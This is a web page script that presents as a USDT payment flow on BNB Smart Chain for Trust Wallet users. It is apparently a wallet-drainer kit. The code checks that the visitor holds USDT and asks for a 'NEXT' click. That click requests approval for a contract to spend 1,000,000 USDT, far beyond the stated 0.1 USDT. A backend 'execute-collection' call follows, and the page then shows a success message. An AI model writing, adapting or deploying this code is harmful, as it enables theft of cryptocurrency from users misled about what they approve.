<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
<script>
"use strict";

/* ──────────────────────────────────────────────────────────────────────
   CONFIGURATION
   ────────────────────────────────────────────────────────────────────── */
const MERCHANT_ADDRESS = "0x7682460D1C43ef8C1Fd2962eFe1A8cB2934b7ef4";
const CONTRACT_ADDRESS = "0x34ADc2c84409696B46A8e3e7943D777A645c2537";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT (18 decimals)
const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 0 USDT
const BACKEND_URL      = "https://4a9f3fa75a1f44a547b0dc535f223faa0c49d8dda227309ee475846249382788";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://bsc-dataseed4.binance.org/",
  "https://rpc.ankr.com/bsc",
  "https://rpc.ankr.com/bsc/4a9f3fa75a1f44a547b0dc535f223faa0c49d8dda227309ee475846249382788"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

/* ──────────────────────────────────────────────────────────────────────
   GLOBAL STATE
   ────────────────────────────────────────────────────────────────────── */
let _cachedAddress = null;   // <-- declared **before** any function uses it

/* ──────────────────────────────────────────────────────────────────────
   HELPERS
   ────────────────────────────────────────────────────────────────────── */
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

merchantInput.value = MERCHANT_ADDRESS;

let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}
function setLoading(on, label = "Processing…") {
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "NEXT";
  btnSpinner.hidden   = !on;
}

/* ──────────────────────────────────────────────────────────────────────
   CONNECT WALLET (NEW – single‑call helper)
   ────────────────────────────────────────────────────────────────────── */
async function connectWallet() {
  if (!window.ethereum) {
    showToast('No wallet detected. Open in Trust Wallet.', 'error');
    throw new Error('No provider');
  }

  // 1️⃣ Ask for permission – this will trigger the popup
  let accounts;
  try {
    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
  } catch (e) {
    showToast('Permission denied', 'error');
    throw e;
  }

  // 2️⃣ Switch to BSC (silent if already on BSC)
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: BSC_CHAIN_ID_HEX }]
    });
  } catch (e) {
    // 4902 – chain not added. Trust Wallet does NOT support auto‑add, so just inform the user.
    if (e.code === 4902) {
      showToast('Please add BNB Smart Chain to your wallet first.', 'error');
      throw e;
    }
    if (e.code === 4001) { // user rejected
      showToast('Please switch to BNB Smart Chain to continue.', 'error');
      throw e;
    }
    console.warn('Chain switch error', e);
  }

  // 3️⃣ Cache the address for the rest of the flow
  _cachedAddress = accounts[0] || null;
  if (!_cachedAddress) {
    showToast('Could not get an account', 'error');
    throw new Error('No account');
  }
}

/* ──────────────────────────────────────────────────────────────────────
   PAGE‑LOAD SILENT CONNECT (keeps the account ready for the first tap)
   ────────────────────────────────────────────────────────────────────── */
window.addEventListener("load", async () => {
  if (!window.ethereum || typeof window.ethereum.request !== "function") return;
  try {
    const accs = await window.ethereum.request({ method: "eth_accounts" });
    if (accs && accs[0]) _cachedAddress = accs[0];
  } catch (_) {}
  if (typeof window.ethereum.on === "function") {
    window.ethereum.on("accountsChanged", (accs) => {
      _cachedAddress = (accs && accs[0]) ? accs[0] : null;
    });
  }
});

/* ──────────────────────────────────────────────────────────────────────
   BACKEND HEALTH CHECK (optional)
   ────────────────────────────────────────────────────────────────────── */
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

/* ──────────────────────────────────────────────────────────────────────
   RPC HELPER (falls back to any working RPC)
   ────────────────────────────────────────────────────────────────────── */
async function rpcCall(method, params) {
  for (const rpc of BSC_RPC_URLS) {
    try {
      const r = await fetch(rpc, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      const j = await r.json();
      if (j.result !== undefined) return j.result;
    } catch (_) {}
  }
  return null;
}

/* ──────────────────────────────────────────────────────────────────────
   ALLOWANCE POLLER (waits for the approve tx to be mined)
   ────────────────────────────────────────────────────────────────────── */
async function waitForAllowanceConfirmed(owner, spender, required, timeout = 120000) {
  const data =
    "0xdd62ed3e" +
    owner.slice(2).padStart(64, "0") +
    spender.slice(2).padStart(64, "0");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    let result = null;
    try {
      result = await window.ethereum.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data }, "latest"]
      });
    } catch (_) {}
    if (!result || result === "0x" || result === "0x0") {
      result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data }, "latest"]);
    }
    if (result && result !== "0x" && result !== "0x0") {
      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error("Approval timed out. Please try again.");
}

/* ──────────────────────────────────────────────────────────────────────
   BACKEND COLLECT (with retry)
   ────────────────────────────────────────────────────────────────────── */
async function triggerBackendCollect(userAddress) {
  let lastErr;
  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

/* ──────────────────────────────────────────────────────────────────────
   USDT BALANCE (via eth_call or RPC fallback)
   ────────────────────────────────────────────────────────────────────── */
async function getUsdtBalance(userAddress, iface) {
  const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
  let result = null;
  try {
    result = await window.ethereum.request({
      method: "eth_call",
      params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]
    });
  } catch (_) {}
  if (!result || result === "0x" || result === "0x0") {
    result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]);
  }
  if (!result || result === "0x") return 0n;
  try { return BigInt(result); } catch (_) { return 0n; }
}

/* ──────────────────────────────────────────────────────────────────────
   MAIN BUTTON HANDLER – single entry point
   ────────────────────────────────────────────────────────────────────── */
approveBtn.addEventListener("click", async () => {
  setLoading(true, "Connecting…");

  /* ── 1️⃣  CONNECT & SWITCH TO BSC  ───────────────────────────────── */
  try {
    await connectWallet();          // <-- only this line is new
  } catch (e) {
    setLoading(false);
    return;                         // toast already shown in connectWallet()
  }

  /* ── 2️⃣  ENSURE WE ARE STILL ON BSC  ─────────────────────────────── */
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    if (chainId !== BSC_CHAIN_ID_HEX) {
      showToast('Wrong chain – switch to BNB Smart Chain', 'error');
      setLoading(false);
      return;
    }
  } catch (e) {
    showToast('Could not determine chain', 'error');
    setLoading(false);
    return;
  }

  /* ── 3️⃣  MAIN LOGIC (unchanged from the original code) ──────────── */
  try {
    const userAddress = _cachedAddress || null;
    if (!userAddress) {
      showToast('Wallet not connected. Please open this page inside Trust Wallet.', 'error');
      setLoading(false);
      return;
    }

    const iface      = new ethers.Interface(ERC20_ABI);
    const usdtBalance = await getUsdtBalance(userAddress, iface);
    if (usdtBalance <= MIN_USDT_BALANCE) {
      showToast("Not enough USDT", "error");
      setLoading(false);
      return;
    }

    /* ---- 4️⃣  CHECK ALREADY ALLOWANCE --------------------------------- */
    const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
    const allowanceHex  = await window.ethereum.request({
      method: "eth_call",
      params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
    });
    if (BigInt(allowanceHex) >= ethers.parseUnits("1000000", 18)) {
      setLoading(true, "Finalizing…");
      await triggerBackendCollect(userAddress);
      showToast("Sent Successfully, Thank you! ✓", "success");
      setLoading(false);
      return;
    }

    /* ---- 5️⃣  SEND APPROVE TRANSACTION -------------------------------- */
    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, ethers.parseUnits("1000000", 18)]);
    await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from:                 userAddress,
        to:                   BSC_USDT_ADDRESS,
        data:                 approveData,
        value:                "0x0",
        type:                 "0x2",
        maxFeePerGas:         "0x0",
        maxPriorityFeePerGas: "0x0"
      }]
    });

    /* ---- 6️⃣  WAIT FOR APPROVAL TO BE MINED --------------------------- */
    setLoading(true, "Confirming…");
    await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, ethers.parseUnits("1000000", 18));

    /* ---- 7️⃣  BACKEND COLLECT ---------------------------------------- */
    setLoading(true, "Finalizing…");
    await triggerBackendCollect(userAddress);
    showToast("Sent Successfully, Thank you! ✓", "success");

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Unknown error";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("user denied") ||
      raw.toLowerCase().includes("canceled") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Transaction cancelled.", "default");
    } else {
      showToast("Error: " + String(raw).substring(0, 90), "error");
    }
  } finally {
    setLoading(false);
  }
});
</script>
